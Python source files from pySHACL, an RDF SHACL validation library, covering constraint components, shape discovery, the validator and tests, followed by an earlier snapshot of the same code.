    https://www.w3.org/TR/shacl/#ClassConstraintComponent
    Textual Definition:
    For each value node that is either a literal, or a non-literal that is not a SHACL instance of $class in the data graph, there is a validation result with the value node as sh:value.
    """"""

    def __init__(self, shape):
        super(ClassConstraintComponent, self).__init__(shape)
        class_rules = list(self.shape.objects(SH_class))
        if len(class_rules) < 1:
            raise ConstraintLoadError(
                ""ClassConstraintComponent must have at least one sh:class predicate."",
                ""https://www.w3.org/TR/shacl/#ClassConstraintComponent"")
        self.class_rules = class_rules

    @classmethod
    def constraint_parameters(cls):
        return [SH_class]

    @classmethod
    def constraint_name(cls):
        return ""ClassConstraintComponent""

    @classmethod
    def shacl_constraint_class(cls):
        return SH_ClassConstraintComponent

    def evaluate(self, target_graph, focus_value_nodes):
        """"""

        :type focus_value_nodes: dict
        :type target_graph: rdflib.Graph
        """"""
        fails = []
        non_conformant = False
        for c in self.class_rules:
            _n, _f = self._evaluate_class_rules(
                target_graph, focus_value_nodes, c)
            non_conformant = non_conformant or _n
            fails.extend(_f)
        return (not non_conformant), fails

    def _evaluate_class_rules(self, target_graph, f_v_dict, class_rule):
        fails = []
        non_conformant = False
        for f, value_nodes in f_v_dict.items():
            for v in value_nodes:
                found = False
                objs = target_graph.objects(v, RDF_type)
                for ctype in iter(objs):
                    if ctype == class_rule:
                        found = True
                        break
                    # Note, this only ones _one_ level of subclass traversing.
                    # For more levels, the whole target graph should be put through
                    # a RDFS reasoning engine.
                    subclasses = target_graph.objects(ctype, RDFS_subClassOf)
                    if class_rule in iter(subclasses):
                        found = True
                        break
                if not found:
                    non_conformant = True
                    fail = self.make_failure(f, value_node=v)
                    fails.append(fail)
        return non_conformant, fails


class DatatypeConstraintComponent(ConstraintComponent):
    """"""
    sh:datatype specifies a condition to be satisfied with regards to the datatype of each value node.
    Link:
    https://www.w3.org/TR/shacl/#DatatypeConstraintComponent
    Textual Definition:
    For each value node that is not a literal, or is a literal with a datatype that does not match $datatype, there is a validation result with the value node as sh:value. The datatype of a literal is determined following the datatype function of SPARQL 1.1. A literal matches a datatype if the literal's datatype has the same IRI and, for the datatypes supported by SPARQL 1.1, is not an ill-typed literal.
    """"""

    def __init__(self, shape):
        super(DatatypeConstraintComponent, self).__init__(shape)
        datatype_rules = list(self.shape.objects(SH_datatype))
        if len(datatype_rules) < 1:
            raise ConstraintLoadError(
                ""DatatypeConstraintComponent must have at least one sh:datatype predicate."",
                ""https://www.w3.org/TR/shacl/#DatatypeConstraintComponent"")
        elif len(datatype_rules) > 1:
            raise ConstraintLoadError(
                ""DatatypeConstraintComponent must have at most one sh:datatype predicate."",
                ""https://www.w3.org/TR/shacl/#DatatypeConstraintComponent"")
        self.datatype_rule = datatype_rules[0]

    @classmethod
    def constraint_parameters(cls):
        return [SH_datatype]

    @classmethod
    def constraint_name(cls):
        return ""DatatypeConstraintComponent""

    @classmethod
    def shacl_constraint_class(cls):
        return SH_DatatypeConstraintComponent

    def evaluate(self, target_graph, focus_value_nodes):
        """"""

        :type focus_value_nodes: dict
        :type target_graph: rdflib.Graph
        """"""
        fails = []
        non_conformant = False
        dtype_rule = self.datatype_rule
        for f, value_nodes in focus_value_nodes.items():
            for v in value_nodes:
                matches = False
                if isinstance(v, Literal):
                    datatype = v.datatype
                    if datatype == dtype_rule:
                        matches = self._assert_actual_datatype(v, dtype_rule)
                    elif datatype is None and dtype_rule == XSD_string:
                        matches = self._assert_actual_datatype(v, dtype_rule)
                    elif dtype_rule == RDF_langString and v.language:
                        matches = self._assert_actual_datatype(v, dtype_rule)
                if not matches:
                    non_conformant = True
                    fail = self.make_failure(f, value_node=v)
                    fails.append(fail)
        return (not non_conformant), fails

    def _assert_actual_datatype(self, value_node, datatype_rule):
        value = value_node.value
        if datatype_rule == XSD_string or datatype_rule == RDF_langString:
            return isinstance(value, (str, bytes))
        elif datatype_rule == XSD_integer:
            return isinstance(value, int)
        elif datatype_rule == XSD_float:
            return isinstance(value, float)
        elif datatype_rule == XSD_boolean:
            return isinstance(value, bool)
        elif datatype_rule == XSD_date:
            return isinstance(value, date)
        elif datatype_rule == XSD_time:
            return isinstance(value, time)
        elif datatype_rule == XSD_dateTime:
            return isinstance(value, datetime)
        else:
            # We don't know how to check other datatypes. Assume pass.
            return True

class NodeKindConstraintComponent(ConstraintComponent):
    """"""
    sh:nodeKind specifies a condition to be satisfied by the RDF node kind of each value node.
    Link:
    https://www.w3.org/TR/shacl/#NodeKindConstraintComponent
    Textual Definition:
    For each value node that does not match $nodeKind, there is a validation result with the value node as sh:value. Any IRI matches only sh:IRI, sh:BlankNodeOrIRI and sh:IRIOrLiteral. Any blank node matches only sh:BlankNode, sh:BlankNodeOrIRI and sh:BlankNodeOrLiteral. Any literal matches only sh:Literal, sh:BlankNodeOrLiteral and sh:IRIOrLiteral.
    """"""

    def __init__(self, shape):
        super(NodeKindConstraintComponent, self).__init__(shape)
        nodekind_rules = list(self.shape.objects(SH_nodeKind))
        if len(nodekind_rules) < 1:
            raise ConstraintLoadError(
                ""NodeKindConstraintComponent must have at least one sh:nodeKind predicate."",
                ""https://www.w3.org/TR/shacl/#NodeKindConstraintComponent"")
        elif len(nodekind_rules) > 1:
            raise ConstraintLoadError(
                ""NodeKindConstraintComponent must have at most one sh:nodeKind predicate."",
                ""https://www.w3.org/TR/shacl/#NodeKindConstraintComponent"")
        self.nodekind_rule = nodekind_rules[0]

    @classmethod
    def constraint_parameters(cls):
        return [SH_nodeKind]

    @classmethod
    def constraint_name(cls):
        return ""NodeKindConstraintComponent""

    @classmethod
    def shacl_constraint_class(cls):
        return SH_NodeKindConstraintComponent

    def evaluate(self, target_graph, focus_value_nodes):
        """"""

        :type focus_value_nodes: dict
        :type target_graph: rdflib.Graph
        """"""
        n_rule = self.nodekind_rule
        fails = []
        non_conformant = False
        for f, value_nodes in focus_value_nodes.items():
            for v in value_nodes:
                match = False
                if isinstance(v, rdflib.BNode):
                    if n_rule in (SH_BlankNode, SH_BlankNodeORLiteral, SH_BlankNodeOrIRI):
                        match = True
                elif isinstance(v, rdflib.Literal):
                    if n_rule in (SH_Literal, SH_BlankNodeORLiteral, SH_IRIOrLiteral):
                        match = True
                elif isinstance(v, rdflib.term.Identifier):
                    if n_rule in (SH_IRI, SH_IRIOrLiteral, SH_BlankNodeOrIRI):
                        match = True
                if not match:
                    non_conformant = True
                    fail = self.make_failure(f, value_node=v)
                    fails.append(fail)
        return (not non_conformant), fails

    def _evaluate_nodekind_rules(self, target_graph, f_v_pairs, nodekind_rule):
        fails = []
        non_conformant = False

        return non_conformant, fails
/n/n/npyshacl/consts.py/n/n# -*- coding: utf-8 -*-
import rdflib

from rdflib.namespace import Namespace
from rdflib import RDFS, RDF, OWL

SH = Namespace('http://www.w3.org/ns/shacl#')

# Classes
RDFS_Class = RDFS.term('Class')
SH_NodeShape = SH.term('NodeShape')
SH_PropertyShape = SH.term('PropertyShape')
SH_ValidationResult = SH.term('ValidationResult')
SH_ValidationReport = SH.term('ValidationReport')
SH_Violation = SH.term('Violation')
SH_Info = SH.term('Info')
SH_Warning = SH.term('Warning')
SH_IRI = SH.term('IRI')
SH_BlankNode = SH.term('BlankNode')
SH_Literal = SH.term('Literal')
SH_BlankNodeOrIRI = SH.term('BlankNodeOrIRI')
SH_BlankNodeORLiteral = SH.term('BlankNodeOrLiteral')
SH_IRIOrLiteral = SH.term('IRIOrLiteral')

# predicates
RDF_type = RDF.term('type')
RDFS_subClassOf = RDFS.term('subClassOf')
SH_path = SH.term('path')
SH_property = SH.term('property')
SH_node = SH.term('node')
SH_targetClass = SH.term('targetClass')
SH_targetNode = SH.term('targetNode')
SH_targetObjectsOf = SH.term('targetObjectsOf')
SH_targetSubjectsOf = SH.term('targetSubjectsOf')
SH_focusNode = SH.term('focusNode')
SH_resultSeverity = SH.term('resultSeverity')
SH_resultPath = SH.term('resultPath')
SH_sourceConstraintComponent = SH.term('sourceConstraintComponent')
SH_sourceShape = SH.term('sourceShape')
SH_severity = SH.term('severity')
SH_value = SH.term('value')
SH_conforms = SH.term('conforms')
SH_result = SH.term('result')
/n/n/npyshacl/errors.py/n/n# -*- coding: utf-8 -*-


class ShapeLoadError(RuntimeError):
    def __init__(self, message, link):
        self.message = message
        self.link = link

    @property
    def args(self):
        return [self.message, self.link]

    def __str__(self):
        return ""{}\n{}"".format(str(self.message), str(self.link))

    def __repr__(self):
        return ""ShapeLoadError: {}"".format(self.__str__())

class ConstraintLoadError(RuntimeError):
    def __init__(self, message, link):
        self.message = message
        self.link = link

    @property
    def args(self):
        return [self.message, self.link]

    def __str__(self):
        return ""{}\n{}"".format(str(self.message), str(self.link))

    def __repr__(self):
        return ""ShapeLoadError: {}"".format(self.__str__())/n/n/npyshacl/shape.py/n/n# -*- coding: utf-8 -*-
import rdflib
from pyshacl.consts import *
import logging

from pyshacl.errors import ShapeLoadError
from pyshacl.constraints import ALL_CONSTRAINT_PARAMETERS, CONSTRAINT_PARAMETERS_MAP

log = logging.getLogger(__name__)


class Shape(object):
    all_shapes = {}

    def __init__(self, sg, node, p=False, path=None):
        """"""

        :type sg: rdflib.Graph
        :type node: rdflib.term.Node
        :type p: bool
        """"""
        self.sg = sg
        self.node = node
        self._p = p
        self._path = path
        self.__class__.all_shapes[(id(sg), node)] = self

    def get_other_shape(self, shape_node):
        try:
            return self.__class__.all_shapes[(id(self.sg), shape_node)]
        except (KeyError, AttributeError):
            return None

    @property
    def is_property_shape(self):
        return bool(self._p)

    def property_shapes(self):
        return self.sg.objects(self.node, SH_property)


    def parameters(self):
        return (p for p, v in self.sg.predicate_objects(self.node)
                if p in ALL_CONSTRAINT_PARAMETERS)

    def objects(self, predicate=None):
        return self.sg.objects(self.node, predicate)

    def target_nodes(self):
        return self.sg.objects(self.node, SH_targetNode)

    def target_classes(self):
        return self.sg.objects(self.node, SH_targetClass)

    def implicit_class_targets(self):
        types = self.sg.objects(self.node, RDF_type)
        if RDFS_Class in iter(types):
            return [self.node]
        return []

    def target_objects_of(self):
        return self.sg.objects(self.node, SH_targetObjectsOf)

    def target_subjects_of(self):
        return self.sg.objects(self.node, SH_targetSubjectsOf)

    def path(self):
        if not self.is_property_shape:
            return None
        if self._path is not None:
            return self._path
        return next(list(self.objects(SH_path)))

    def severity(self):
        severity = list(self.objects(SH_severity))
        if len(severity):
            return severity[0]
        else:
            return SH_Violation

    def target(self):
        """"""

        :type target_graph: rdflib.Graph
        """"""
        target_nodes = self.target_nodes()
        target_classes = self.target_classes()
        implicit_targets = self.implicit_class_targets()
        target_objects_of = self.target_objects_of()
        target_subjects_of = self.target_subjects_of()
        return (target_nodes, target_classes, implicit_targets,
                target_objects_of, target_subjects_of)


    def focus_nodes(self, target_graph):
        """"""
        The set of focus nodes for a shape may be identified as follows:

        specified in a shape using target declarations
        specified in any constraint that references a shape in parameters of shape-expecting constraint parameters (e.g. sh:node)
        specified as explicit input to the SHACL processor for validating a specific RDF term against a shape
        :return:
        """"""
        (target_nodes, target_classes, implicit_classes, _, _) = self.target()
        found_node_targets = set()
        for n in iter(target_nodes):
            # Note, a node_target _can_ be a literal.
            if n in iter(target_graph.subjects()):
                found_node_targets.add(n)
                continue
            elif n in iter(target_graph.predicates()):
                found_node_targets.add(n)
                continue
            elif n in iter(target_graph.objects()):
                found_node_targets.add(n)
                continue
        target_classes = set(target_classes)
        target_classes.update(set(implicit_classes))
        found_target_instances = set()
        for tc in target_classes:
            s = target_graph.subjects(RDF_type, tc)
            for subject in iter(s):
                found_target_instances.add(subject)
            subc = target_graph.subjects(RDFS_subClassOf, tc)
            for subclass in iter(subc):
                s1 = target_graph.subjects(RDF_type, subclass)
                for subject in iter(s1):
                    found_target_instances.add(subject)
        # TODO: The other two types of targets
        return found_node_targets.union(found_target_instances)

    def value_nodes(self, target_graph, focus):
        """"""
        For each focus node, you can get a set of value nodes.
        For a Node Shape, each focus node has just one value node,
            which is just the focus_node
        :param target_graph:
        :param focus:
        :return:
        """"""
        if not isinstance(focus, (tuple, list, set)):
            focus = [focus]
        if not self.is_property_shape:
            return {f: set((f,)) for f in focus}
        path = self.path()
        focus_dict = {}
        for f in focus:
            if isinstance(path, rdflib.URIRef):
                values = set(target_graph.objects(f, path))
            else:
                raise NotImplementedError(""value nodes of property shapes are not yet implmented."")
            focus_dict[f] = values
        return focus_dict


    def validate(self, target_graph, focus=None, bail_on_error=False):
        assert isinstance(target_graph, rdflib.Graph)
        if focus is not None:
            if not isinstance(focus, (tuple, list, set)):
                focus = [focus]
        else:
            focus = self.focus_nodes(target_graph)
        if len(focus) < 1:
            # Its possible for shapes to have _no_ focus nodes
            # (they are called in other ways)
            return True, []
        run_count = 0
        parameters = self.parameters()
        fails = []
        focus_value_nodes = self.value_nodes(target_graph, focus)
        non_conformant = False
        done_constraints = set()
        for p in iter(parameters):
            constraint_component = CONSTRAINT_PARAMETERS_MAP[p]
            if constraint_component in done_constraints:
                continue
            c = constraint_component(self)
            _is_conform, _fails = c.evaluate(target_graph, focus_value_nodes)
            non_conformant = non_conformant or (not _is_conform)
            fails.extend(_fails)
            run_count += 1
            done_constraints.add(constraint_component)
            if non_conformant and bail_on_error:
                break
        if run_count < 1:
            raise RuntimeError(""A SHACL Shape should have at least one parameter or attached property shape."")
        return (not non_conformant), fails

""""""
A shape is an IRI or blank node s that fulfills at least one of the following conditions in the shapes graph:

    s is a SHACL instance of sh:NodeShape or sh:PropertyShape.
    s is subject of a triple that has sh:targetClass, sh:targetNode, sh:targetObjectsOf or sh:targetSubjectsOf as predicate.
    s is subject of a triple that has a parameter as predicate.
    s is a value of a shape-expecting, non-list-taking parameter such as sh:node, or a member of a SHACL list that is a value of a shape-expecting and list-taking parameter such as sh:or.
""""""

def find_shapes(g, infer_shapes=False):
    """"""
    :param g: The Shapes Graph (SG)
    :type g: rdflib.Graph
    :returns: [Shape]
    """"""
    defined_node_shapes = set(g.subjects(RDF_type, SH_NodeShape))
    for s in defined_node_shapes:
        path_vals = list(g.objects(s, SH_path))
        if len(path_vals) > 0:
            raise ShapeLoadError(
                ""A shape defined as a NodeShape cannot be the subject of a 'sh:path' predicate."",
                ""https://www.w3.org/TR/shacl/#node-shapes"")

    defined_prop_shapes = set(g.subjects(RDF_type, SH_PropertyShape))
    found_prop_shapes_paths = dict()
    for s in defined_prop_shapes:
        if s in defined_node_shapes:
            raise ShapeLoadError(
                ""A shape defined as a NodeShape cannot also be defined as a PropertyShape."",
                ""https://www.w3.org/TR/shacl/#node-shapes"")
        path_vals = list(g.objects(s, SH_path))
        if len(path_vals) < 1:
            raise ShapeLoadError(
                ""A shape defined as a PropertyShape must be the subject of a 'sh:path' predicate."",
                ""https://www.w3.org/TR/shacl/#property-shapes"")
        elif len(path_vals) > 1:
            raise ShapeLoadError(
                ""A shape defined as a PropertyShape cannot have more than one 'sh:path' predicate."",
                ""https://www.w3.org/TR/shacl/#property-shapes"")
        found_prop_shapes_paths[s] = path_vals[0]

    has_target_class = {s for s, o in g.subject_objects(SH_targetClass)}
    has_target_node = {s for s, o in g.subject_objects(SH_targetNode)}
    has_target_objects_of = {s for s, o in g.subject_objects(SH_targetObjectsOf)}
    has_target_subjects_of = {s for s, o in g.subject_objects(SH_targetSubjectsOf)}
    subject_shapes = set(has_target_class).union(set(has_target_node).union(set(has_target_objects_of).union(set(has_target_subjects_of))))

    value_of_property = {o for s, o in g.subject_objects(SH_property)}
    value_of_node = {o for s, o in g.subject_objects(SH_node)}
    value_of_shapes = set(value_of_property).union(set(value_of_node))

    if infer_shapes:
        log.warning(""Inferring shapes is not yet supported"")

    found_node_shapes = set()
    found_prop_shapes = set()
    for s in subject_shapes:
        if s in defined_node_shapes or s in defined_prop_shapes:
            continue
        path_vals = list(g.objects(s, SH_path))
        if len(path_vals) < 1:
            found_node_shapes.add(s)
        elif len(path_vals) > 1:
            raise ShapeLoadError(
                ""An implicit PropertyShape cannot have more than one 'sh:path' predicate."",
                ""https://www.w3.org/TR/shacl/#property-shapes"")
        else:
            found_prop_shapes.add(s)
            found_prop_shapes_paths[s] = path_vals[0]
    for s in value_of_shapes:
        if s in defined_node_shapes or s in defined_prop_shapes or \
                s in found_prop_shapes or s in found_node_shapes:
            continue
        path_vals = list(g.objects(s, SH_path))
        if len(path_vals) < 1:
            found_node_shapes.add(s)
        elif len(path_vals) > 1:
            raise ShapeLoadError(
                ""An implicit PropertyShape cannot have more than one 'sh:path' predicate."",
                ""https://www.w3.org/TR/shacl/#property-shapes"")
        else:
            found_prop_shapes.add(s)
            found_prop_shapes_paths[s] = path_vals[0]
    created_node_shapes = set()
    for node_shape in defined_node_shapes.union(found_node_shapes):
        s = Shape(g, node_shape, False)
        created_node_shapes.add(s)
    created_prop_shapes = set()
    for prop_shape in defined_prop_shapes.union(found_prop_shapes):
        prop_shape_path = found_prop_shapes_paths[prop_shape]
        s = Shape(g, prop_shape, True, path=prop_shape_path)
        created_prop_shapes.add(s)
    return list(created_node_shapes.union(created_prop_shapes))
/n/n/npyshacl/validate.py/n/n# -*- coding: utf-8 -*-
import rdflib
import RDFClosure as owl_rl
if owl_rl.json_ld_available:
    import rdflib_jsonld
from pyshacl.shape import find_shapes
from pyshacl.consts import RDF_type, SH_conforms, \
    SH_result, SH_ValidationReport
import logging

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


class Validator(object):
    @classmethod
    def _load_default_options(cls, options_dict):
        options_dict['inference'] = True
        options_dict['abort_on_error'] = False

    @classmethod
    def _run_pre_inference(cls, target_graph):
        try:
            inferencer = owl_rl.DeductiveClosure(owl_rl.RDFS_OWLRL_Semantics)
        except Exception as e:
            log.error(""Error during creation of OWL-RL Deductive Closure"")
            raise e
        try:
            inferencer.expand(target_graph)
        except Exception as e:
            log.error(""Error while running OWL-RL Deductive Closure"")
            raise e

    @classmethod
    def create_validation_report(cls, conforms, results):
        v_text = ""Validation Report\nConforms: {}\n"".format(str(conforms))
        result_len = len(results)
        if not conforms:
            assert result_len > 0, \
                ""A Non-Conformant Validation Report must have at least one result.""
        if result_len > 0:
            v_text += ""Results ({}):\n"".format(str(result_len))
        vg = rdflib.Graph()
        vr = rdflib.BNode()
        vg.add((vr, RDF_type, SH_ValidationReport))
        vg.add((vr, SH_conforms, rdflib.Literal(conforms)))
        for result in iter(results):
            _d, _bn, _tr = result
            v_text += _d
            vg.add((vr, SH_result, _bn))
            for tr in iter(_tr):
                vg.add(tr)
        log.info(v_text)
        return vg

    def __init__(self, target_graph, *args,
                 shacl_graph=None, options=None, **kwargs):
        if options is None:
            options = {}
        self._load_default_options(options)
        self.options = options
        assert isinstance(target_graph, rdflib.Graph),\
            ""target_graph must be a rdflib Graph object""
        self.target_graph = target_graph
        if shacl_graph is None:
            shacl_graph = target_graph
        assert isinstance(shacl_graph, rdflib.Graph),\
            ""shacl_graph must be a rdflib Graph object""
        self.shacl_graph = shacl_graph

    def run(self):
        if self.options.get('inference', True):
            self._run_pre_inference(self.target_graph)
        shapes = find_shapes(self.shacl_graph)
        fails = []
        non_conformant = False
        for s in shapes:
            _is_conform, _fails = s.validate(self.target_graph)
            non_conformant = non_conformant or (not _is_conform)
            fails.extend(_fails)
        report = self.create_validation_report((not non_conformant), fails)
        return (not non_conformant), report


# TODO: check out rdflib.util.guess_format() for format. I think it works well except for perhaps JSON-LD
def _load_into_graph(target):
    if isinstance(target, rdflib.Graph):
        return target
    target_is_file = False
    target_is_text = False
    rdf_format = None
    if isinstance(target, str):
        if target.startswith('file://'):
            target_is_file = True
            target = target[7:]
        elif len(target) < 240:
            if target.endswith('.ttl'):
                target_is_file = True
                rdf_format = 'turtle'
            elif target.endswith('.xml'):
                target_is_file = True
                rdf_format = 'xml'
            elif target.endswith('.json'):
                target_is_file = True
                rdf_format = 'json-ld'
        if not target_is_file:
            target_is_text = True
    else:
        raise RuntimeError(""Cannot determine the format of the input graph"")
    g = rdflib.Graph()
    if target_is_file:
        import os
        file_name = os.path.abspath(target)
        with open(file_name, mode='rb') as file:
            g.parse(source=None, publicID=None, format=rdf_format,
                    location=None, file=file)
    elif target_is_text:
        g.parse(source=target)
    return g


def validate(target_graph, *args, shacl_graph=None, inference=True, abort_on_error=False, **kwargs):
    target_graph = _load_into_graph(target_graph)
    if shacl_graph is not None:
        shacl_graph = _load_into_graph(shacl_graph)
    validator = Validator(
        target_graph, shacl_graph,
        options={'inference': inference, 'abort_on_error': abort_on_error})
    return validator.run()


/n/n/ntests/test_validate.py/n/nimport pytest
from os import path, walk
import glob
import pyshacl


here_dir = path.abspath(path.dirname(__file__))
test_files_dir = path.join(here_dir, 'resources', 'tests')
test_core_files = []
test_rules_files = []

for x in walk(path.join(test_files_dir, 'core')):
    for y in glob.glob(path.join(x[0], '*.ttl')):
        test_core_files.append((y, None))

for x in walk(path.join(test_files_dir, 'rules')):
    for y in glob.glob(path.join(x[0], '*.ttl')):
        test_rules_files.append((y, None))

def test_validate_class1():
    simple_file = path.join(test_files_dir, 'core/node/class-001.test.ttl')
    assert pyshacl.validate(simple_file, None)
    return True

def test_validate_class2():
    simple_file = path.join(test_files_dir, 'core/node/class-002.test.ttl')
    assert pyshacl.validate(simple_file, None)
    return True


def test_validate_datatype1():
    simple_file = path.join(test_files_dir, 'core/node/datatype-001.test.ttl')
    assert pyshacl.validate(simple_file, None)
    return True

def test_validate_datatype2():
    simple_file = path.join(test_files_dir, 'core/node/datatype-002.test.ttl')
    assert pyshacl.validate(simple_file, None)
    return True

def test_validate_nodekind1():
    simple_file = path.join(test_files_dir, 'core/node/nodeKind-001.test.ttl')
    assert pyshacl.validate(simple_file, None)
    return True

def test_validate_minCount1():
    simple_file = path.join(test_files_dir, 'core/property/minCount-001.test.ttl')
    assert pyshacl.validate(simple_file, None)
    return True

def test_validate_minCount2():
    simple_file = path.join(test_files_dir, 'core/property/minCount-002.test.ttl')
    assert pyshacl.validate(simple_file, None)
    return True

def test_validate_maxCount1():
    simple_file = path.join(test_files_dir, 'core/property/maxCount-001.test.ttl')
    assert pyshacl.validate(simple_file, None)
    return True

def test_validate_maxCount2():
    simple_file = path.join(test_files_dir, 'core/property/maxCount-002.test.ttl')
    assert pyshacl.validate(simple_file, None)
    return True

def test_validate_property1():
    simple_file = path.join(test_files_dir, 'core/property/property-001.test.ttl')
    assert pyshacl.validate(simple_file, None)
    return True

def test_validate_property_node1():
    simple_file = path.join(test_files_dir, 'core/property/node-001.test.ttl')
    assert pyshacl.validate(simple_file, None)
    return True

def test_validate_property_node2():
    simple_file = path.join(test_files_dir, 'core/property/node-002.test.ttl')
    assert pyshacl.validate(simple_file, None)
    return True

# @pytest.mark.parametrize('target_file, shacl_file', test_core_files)
# def test_validate_all_core(target_file, shacl_file):
#     assert pyshacl.validate(target_file, shacl_file)
#     return True

# @pytest.mark.parametrize('target_file, shacl_file', test_rules_files)
# def test_validate_all_rules(target_file, shacl_file):
#     assert pyshacl.validate(target_file, shacl_file)
#     return True
/n/n/n",0
183,10ccd7a692686c72cf3ba4af0c5306acad6a0f56,"/pyshacl/constraints/__init__.py/n/n# -*- coding: utf-8 -*-

from .value_constraints import ClassConstraintComponent

ALL_CONSTRAINT_COMPONENTS = [
    ClassConstraintComponent
]

CONSTRAINT_PARAMETERS_MAP = {p: c for c in ALL_CONSTRAINT_COMPONENTS
                             for p in c.constraint_parameters()}

ALL_CONSTRAINT_PARAMETERS = list(CONSTRAINT_PARAMETERS_MAP.keys())
/n/n/n/pyshacl/constraints/constraint_component.py/n/n
""""""
https://www.w3.org/TR/shacl/#core-components-value-type
""""""
import abc
import pyshacl.consts

class ConstraintComponent(object, metaclass=abc.ABCMeta):

    def __init__(self, shape):
        self.shape = shape

    @classmethod
    @abc.abstractmethod
    def constraint_parameters(cls):
        return NotImplementedError()

    @abc.abstractmethod
    def evaluate(self, target_graph, value_nodes):
        return NotImplementedError()
/n/n/n/pyshacl/constraints/value_constraints.py/n/n# -*- coding: utf-8 -*-
""""""
https://www.w3.org/TR/shacl/#core-components-value-type
""""""
import rdflib
from pyshacl.constraints.constraint_component import ConstraintComponent
from pyshacl.consts import SH, RDFS_subClassOf, RDF_type

SH_class = SH.term('class')


class ClassConstraintComponent(ConstraintComponent):
    """"""
    The condition specified by sh:class is that each value node is a SHACL instance of a given type.
    Definition:
    For each value node that is either a literal, or a non-literal that is not a SHACL instance of $class in the data graph, there is a validation result with the value node as sh:value.
    """"""

    def __init__(self, shape):
        super(ClassConstraintComponent, self).__init__(shape)
        class_rules = list(self.shape.objects(SH_class))
        if len(class_rules) > 1:
            #TODO: Make a new error type for this
            raise RuntimeError(""sh:class must only have one value."")
        self.class_rule = class_rules[0]

    @classmethod
    def constraint_parameters(cls):
        return [SH_class]

    def evaluate(self, target_graph, value_nodes):
        """"""

        :type value_nodes: list | set
        :type target_graph: rdflib.Graph
        """"""
        fails = []
        for f in value_nodes:
            t = target_graph.objects(f, RDF_type)
            for ctype in iter(t):
                if ctype == self.class_rule:
                    continue
                subclasses = target_graph.objects(ctype, RDFS_subClassOf)
                if self.class_rule in iter(subclasses):
                    continue
            fails.append(f)
        if len(fails) > 0:
            return False, fails
        return True, None

/n/n/n/pyshacl/shape.py/n/n# -*- coding: utf-8 -*-
import rdflib
from pyshacl.consts import *
import logging

from pyshacl.errors import ShapeLoadError
from pyshacl.constraints import ALL_CONSTRAINT_PARAMETERS, CONSTRAINT_PARAMETERS_MAP

log = logging.getLogger(__name__)


class Shape(object):
    def __init__(self, sg, node, p=False):
        """"""

        :type sg: rdflib.Graph
        :type node: rdflib.term.Node
        :type p: bool
        """"""
        self.sg = sg
        self.node = node
        self.p = p

    @property
    def is_property_shape(self):
        return bool(self.p)

    def property_shapes(self):
        return self.sg.objects(self.node, SH_property)

    def parameters(self):
        return (p for p, v in self.sg.predicate_objects(self.node)
                if p in ALL_CONSTRAINT_PARAMETERS)

    def objects(self, predicate=None):
        return self.sg.objects(self.node, predicate)

    def target_nodes(self):
        return self.sg.objects(self.node, SH_targetNode)

    def target_classes(self):
        return self.sg.objects(self.node, SH_targetClass)

    def target_objects_of(self):
        return self.sg.objects(self.node, SH_targetObjectsOf)

    def target_subjects_of(self):
        return self.sg.objects(self.node, SH_targetSubjectsOf)

    def target(self):
        """"""

        :type target_graph: rdflib.Graph
        """"""
        target_nodes = self.target_nodes()
        target_classes = self.target_classes()
        target_objects_of = self.target_objects_of()
        target_subjects_of = self.target_objects_of()
        return (target_nodes, target_classes,
                target_objects_of, target_subjects_of)


    def focus_nodes(self, target_graph):
        """"""
        The set of focus nodes for a shape may be identified as follows:

        specified in a shape using target declarations
        specified in any constraint that references a shape in parameters of shape-expecting constraint parameters (e.g. sh:node)
        specified as explicit input to the SHACL processor for validating a specific RDF term against a shape
        :return:
        """"""
        (target_nodes, target_classes, _, _) = self.target()
        found_node_targets = set()
        for n in iter(target_nodes):
            # Note, a node_target _can_ be a literal.
            if n in iter(target_graph.subjects()):
                found_node_targets.add(n)
                continue
            elif n in iter(target_graph.predicates()):
                found_node_targets.add(n)
                continue
            elif n in iter(target_graph.objects()):
                found_node_targets.add(n)
                continue
        found_target_classes = set()
        for tc in iter(target_classes):
            s = target_graph.subjects(RDF_type, tc)
            for subject in iter(s):
                found_target_classes.add(subject)
            subc = target_graph.subjects(RDFS_subClassOf, tc)
            for subclass in iter(subc):
                s1 = target_graph.subjects(RDF_type, subclass)
                for subject in iter(s1):
                    found_target_classes.add(subject)
        # TODO: The other two types of targets
        return found_node_targets.union(found_target_classes)

    def value_nodes(self, target_graph, focus):
        if not isinstance(focus, (tuple, list, set)):
            focus = [focus]
        if self.is_property_shape:
            raise NotImplementedError(""value nodes of property shapes are not yet implmented."")
        else:
            return focus

    def validate(self, target_graph, focus=None):
        assert isinstance(target_graph, rdflib.Graph)
        if focus is not None:
            if not isinstance(focus, (tuple, list, set)):
                focus = [focus]
        else:
            focus = self.focus_nodes(target_graph)
        run_count = 0
        parameters = self.parameters()
        results = {}
        value_nodes = self.value_nodes(target_graph, focus)
        for p in iter(parameters):
            constraint_component = CONSTRAINT_PARAMETERS_MAP[p]
            c = constraint_component(self)
            res = c.evaluate(target_graph, value_nodes)
            results[p] = res
            run_count += 1
        if run_count < 1:
            raise RuntimeError(""A SHACL Shape should have at least one parameter or attached property shape."")
        return results

""""""
A shape is an IRI or blank node s that fulfills at least one of the following conditions in the shapes graph:

    s is a SHACL instance of sh:NodeShape or sh:PropertyShape.
    s is subject of a triple that has sh:targetClass, sh:targetNode, sh:targetObjectsOf or sh:targetSubjectsOf as predicate.
    s is subject of a triple that has a parameter as predicate.
    s is a value of a shape-expecting, non-list-taking parameter such as sh:node, or a member of a SHACL list that is a value of a shape-expecting and list-taking parameter such as sh:or.
""""""

def find_shapes(g, infer_shapes=False):
    """"""
    :param g: The Shapes Graph (SG)
    :type g: rdflib.Graph
    :returns: [Shape]
    """"""
    defined_node_shapes = set(g.subjects(RDF_type, SH_NodeShape))
    for s in defined_node_shapes:
        path_vals = list(g.objects(s, SH_path))
        if len(path_vals) > 0:
            raise ShapeLoadError(
                ""A shape defined as a NodeShape cannot be the subject of a 'sh:path' predicate."",
                ""https://www.w3.org/TR/shacl/#node-shapes"")

    defined_prop_shapes = set(g.subjects(RDF_type, SH_PropertyShape))
    for s in defined_prop_shapes:
        if s in defined_node_shapes:
            raise ShapeLoadError(
                ""A shape defined as a NodeShape cannot also be defined as a PropertyShape."",
                ""https://www.w3.org/TR/shacl/#node-shapes"")
        path_vals = list(g.objects(s, SH_path))
        if len(path_vals) < 1:
            raise ShapeLoadError(
                ""A shape defined as a PropertyShape must be the subject of a 'sh:path' predicate."",
                ""https://www.w3.org/TR/shacl/#property-shapes"")
        elif len(path_vals) > 1:
            raise ShapeLoadError(
                ""A shape defined as a PropertyShape cannot have more than one 'sh:path' predicate."",
